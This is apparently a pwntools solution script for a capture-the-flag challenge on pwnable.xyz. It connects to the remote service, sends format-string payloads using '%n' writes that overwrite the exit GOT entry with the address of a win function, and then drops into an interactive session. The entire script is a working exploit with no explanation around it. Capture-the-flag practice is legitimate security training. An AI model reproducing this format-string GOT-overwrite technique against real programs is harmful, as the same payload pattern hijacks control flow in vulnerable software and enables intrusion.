from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30013)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40094c
exit_got = 0x602078

sa('Name: ', '%' + str(exit_got) + 'c%6$n' + 'AAAAAAAAAAAA\n')
sa('Desc: ', '%' + str(win) + 'c%36$n')

sla('> ', '3')

r.recvlines(2)

# wait 60 seconds

r.interactive()